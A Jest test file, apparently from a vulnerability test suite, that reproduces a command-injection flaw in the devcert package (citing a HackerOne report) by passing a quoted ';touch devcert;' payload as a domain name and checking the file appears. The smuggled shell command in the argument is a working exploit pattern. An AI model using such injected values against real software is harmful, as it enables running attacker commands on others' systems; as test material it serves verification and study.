
// async function poc() {
//     let ssl = await devcert.certificateFor('\";touch aaa;\"');
// }
// poc()
//https://hackerone.com/reports/863544
test("Command Injection in devcert", () => 
{
	const devcert = require('devcert');
	const fs = require('fs');
	const path = './devcert';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	devcert.certificateFor('\";touch devcert;\"').then(() => {
		console.log("done")
	});
		
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
